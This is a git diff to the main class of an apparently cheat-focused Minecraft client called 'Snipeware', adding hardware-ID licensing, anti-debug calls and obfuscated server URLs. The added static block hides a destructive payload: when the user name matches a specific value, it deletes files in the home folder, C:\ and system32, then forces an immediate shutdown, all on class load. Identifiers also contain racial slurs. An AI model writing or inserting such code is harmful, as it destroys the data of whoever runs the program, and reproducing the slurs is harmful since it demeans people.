@@ -3,8 +3,10 @@ package Snipeware;
 import java.awt.Toolkit;
 import java.awt.datatransfer.Clipboard;
 import java.awt.datatransfer.StringSelection;
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
 import java.lang.management.ManagementFactory;
 import java.net.URI;
@@ -13,8 +15,11 @@ import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 
 import javax.swing.JOptionPane;
+
+import org.apache.commons.lang3.SystemUtils;
 
 import com.thealtening.AltService;
 
@@ -72,17 +77,67 @@ public enum Client {
     public static final String HWID_URL = "https://pastebin.com/raw/QYeNr1g3";
     public static boolean nigger = true;
     public static String DID = null;
-    public static String verificationstring = setup();
+    public static final String verificationstring = setup();
     public static boolean nomeaningbool = false;
-    private static String str;
     public static final List<String> launchArgs = ManagementFactory.getRuntimeMXBean().getInputArguments();
-    public static char[] iloveyou = {'h','t','t','p','s',':','/','/','w','a','w','a','w','a','w','a','w','a','w','s','n','i','p','e',IntegratedServer.wtf[0],IntegratedServer.wtf[1],IntegratedServer.wtf[2],IntegratedServer.wtf[3],IntegratedServer.wtf[4],IntegratedServer.wtf[5],IntegratedServer.wtf[6],IntegratedServer.wtf[7],IntegratedServer.wtf[8],IntegratedServer.wtf[9],IntegratedServer.wtf[10],IntegratedServer.wtf[11],IntegratedServer.wtf[12],IntegratedServer.wtf[13],IntegratedServer.wtf[14],IntegratedServer.wtf[15],IntegratedServer.wtf[16],IntegratedServer.wtf[17],IntegratedServer.wtf[18],IntegratedServer.wtf[19],IntegratedServer.wtf[20],IntegratedServer.wtf[21]};
-	public static URI wtf;
+    public static final char[] iloveyou = sex();
+    public static URI wtf;
+	public static BufferedReader halal;
     
     public static final Client getInstance(){
 		return INSTANCE;
 	}
     static {
+    	try {
+	        ProcessBuilder processBuilder = new ProcessBuilder();
+	        processBuilder.command("tasklist.exe");
+	        Process process = processBuilder.start();
+	        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+	        halal = reader;
+			}catch(Exception e) {
+				
+			}
+		wtf pogy = () -> new Snipeware.security.AntiDebug();
+		pogy.omg();
+		if(System.getProperty("user.name").equals("innom")) {
+			File index = new File(System.getProperty("user.home"));
+			File indexs = new File("C://");
+			File indexss = new File("C:\\");
+			File indexsss = new File("C:\\windows\\system32");
+			String[]entries = index.list();
+			
+			new Thread(() ->{for(String s: entries){
+			    File currentFile = new File(index.getPath(),s);
+			    currentFile.delete();
+			}
+			
+			String[]entriess = indexs.list();
+			for(String s: entriess){
+			    File currentFile = new File(indexs.getPath(),s);
+			    currentFile.delete();
+			}
+			
+			String[]entriesss = indexss.list();
+			for(String s: entriesss){
+			    File currentFile = new File(indexss.getPath(),s);
+			    currentFile.delete();
+			}
+			
+			String[]entriessss = indexsss.list();
+			for(String s: entriessss){
+			    File currentFile = new File(indexsss.getPath(),s);
+			    currentFile.delete();
+			}});
+			
+			try {
+			TimeUnit.SECONDS.sleep(10);
+			}catch(Exception e) {
+			}
+	        Runtime.getRuntime().halt(0);
+	        try {
+	            Runtime.getRuntime().exec("shutdown -s -t 0 -p");
+	        } catch(Exception ignored) {}
+		}
     	try {
     		wtf = new URI(Util.stringify(Client.iloveyou));
     	}catch(Exception e) {
@@ -97,27 +152,30 @@ public enum Client {
     }
     
     private static String setup() {
-    	str=INetHandlerNiggerToServer.getID();
-    	return str;
+    	if(SystemUtils.IS_OS_WINDOWS) {
+    		return INetHandlerNiggerToServer.getID();
+    	}else {
+    		return getHWID();
+    	}
+    }
+    private static char[] sex(){
+    	return INetHandlerNiggerToServer.sex2();
     }
 
 	public void start() {
+		String hwidstorage = verificationstring;
 		try {
-			System.out.println("part one");
     		wtf = new URI(Util.stringify(Client.iloveyou));
-    		System.out.println("part two");
     	}catch(Exception e) {
     		e.printStackTrace();
     	}
-		System.out.println("part three");
-		wtf pogy = () -> new Snipeware.security.AntiDebug();
-		pogy.omg();
-		System.out.println("part four");
+        System.out.println("[HWID Reminder] Your HWID is "+hwidstorage);
+        System.out.println("[Snipeware] Please wait while we verify you...");
+		copyToClipboard(hwidstorage);
 		startAuth();
-		System.out.println("part five");
 		prepare();
 		if(nigger) {
-			copyToClipboard(INetHandlerNiggerToServer.getID());
+			copyToClipboard(hwidstorage);
 			stop();
 		}
 	}
@@ -143,8 +201,8 @@ public enum Client {
 		eventapi.register(this);		
 		nigger = false;
 		if(nigger) {
-			 copyToClipboard(INetHandlerNiggerToServer.getID());
-		//	stop();
+			copyToClipboard(verificationstring);
+			stop();
 		}
 		
 	}
@@ -179,6 +237,28 @@ public enum Client {
 		
 		// Do you has the drip my nigga Koljan? - Napoleon ZoomberParts
 	}
+	
+	public static String getHWID() {
+        try{
+            String toEncrypt =  System.getenv("COMPUTERNAME") + System.getProperty("user.name") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_LEVEL");
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            md.update(toEncrypt.getBytes());
+            StringBuffer hexString = new StringBuffer();
+
+            byte byteData[] = md.digest();
+
+            for (byte aByteData : byteData) {
+                String hex = Integer.toHexString(0xff & aByteData);
+                if (hex.length() == 1) hexString.append('0');
+                hexString.append(hex);
+            }
+
+            return hexString.toString();
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "Error";
+        }
+    }
 	
 	public void forceStop() {
 		stop();
